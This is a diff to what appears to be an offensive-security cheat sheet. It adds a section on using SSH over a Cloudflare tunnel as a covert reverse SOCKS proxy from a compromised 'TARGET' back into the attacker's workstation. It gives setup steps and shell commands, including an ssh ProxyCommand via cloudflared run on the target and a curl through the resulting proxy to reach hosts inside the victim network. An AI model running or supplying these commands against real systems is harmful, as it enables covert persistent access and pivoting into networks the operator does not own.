@@ -721,6 +721,34 @@ This also works in combination with:
  * [WireTap](https://github.com/sandialabs/wiretap) - Works as user or root. Uses UDP as transport. ([Try it](https://thc.org/segfault/wireguard) on segfault.)
  * [ligolo-ng](https://github.com/nicocha30/ligolo-ng) - Uses TCP as transport. Works well via [cloudflare CDN](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service) or gs-netcat.
 
+### Use SSH as a cheap reverse proxy via Cloudflare
+
+This method is similar to [HTTPS reverse tunnels](#https) but uses SSH instead of Gost or websocat.
+- Advantage: Only uses *cloudflared* and *SSH* on the target.
+- Disadvantage: Needs a CF subscription.
+
+ 1. Go to your CF Dashboard -> Zero Trust -> Networks -> Tunnels
+ 2. Create a new 'Cloudflared' tunnel of any name.
+ 3. Select Debian & 64-bit. The Token is not fully shown. Extract the "Token" by copying the grayed out area into a separate document to reveal the entire Token (the long hex-strings after `sudo cloudflared service install <TunnelTokenHere>`).
+ 4. Add a subdomain (example uses `ssh.team-teso.net`. Set Type=TCP URL=localhost:22
+
+```shell
+### On YOUR workstation:
+cloudflared tunnel run --token TunnelTokenHere
+```
+
+```shell
+### On the TARGET, create a reverse-SOCKS connection with SSH over Cloudflare:
+ssh -o ProxyCommand="cloudflared access tcp --hostname ssh.team-teso.net" root@0 -R 1080
+```
+
+```shell
+### On your workstation, connect to _any_ host within the target network (example: ipinfo.io)
+curl -x socks5h://0 https://ipinfo.io
+```
+Use [ProxyChains or GrafTCP to tunnel](#scan-proxy) other protocols via the reverse proxy.
+
+
 ---
 <a id="scan-proxy"></a>
 **3.iv. Use any tool via Socks Proxy**
